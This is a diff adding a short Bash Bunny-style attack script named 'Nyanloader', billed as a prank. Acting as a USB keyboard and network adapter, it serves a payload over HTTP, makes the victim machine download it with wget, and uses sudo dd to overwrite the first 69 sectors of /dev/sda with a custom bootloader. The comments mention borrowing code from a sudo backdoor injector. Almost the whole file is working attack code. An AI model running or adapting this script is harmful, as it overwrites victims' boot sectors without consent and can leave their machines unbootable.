@@ -1,0 +1,45 @@
+#!/bin/bash
+#
+# Title:         Nyanloader
+# Author:        Pusher
+# Version:       1.0
+# Category:      Prank
+# Target:        Attack script written for Debian-based OSes. Payload will work on any x86 architecture
+# 
+# Replaces the first 69 (heh) sectors on /dev/sda with a custom bootloader and associated payload.
+# A backup of the original data is created at /home/username/mbr_backup.bin
+# This payload does leverage some code from /library/credentials/SudoBackdoor/injector by oXis.
+# That's right, if unmodified, this payload will only work against root warriors!
+#
+# TODO: Add OS detection and privlege escalation
+# TODO: Add animation and audio to the payload
+#
+# BEGIN!
+
+LED SETUP
+
+ATTACKMODE ECM_ETHERNET HID
+GET SWITCH_POSITION
+GET HOST_IP
+
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+
+cd $payload_dir
+
+LED SPECIAL
+
+# Prepare a simple http server to serve the payload file
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+while ! nc -z localhost 80; do sleep 0.2; done
+
+LED ATTACK
+
+RUN UNITY wget "http://$HOST_IP/payload.bin"
+Q DELAY 200
+RUN UNITY sudo dd if=/dev/sda of=mbr_backup.bin bs=512 seek=0 count=69
+Q DELAY 200
+RUN UNITY sudo dd if=payload.bin of=/dev/sda bs=512 seek=0 count=69
+Q DELAY 200
+
+LED FINISH
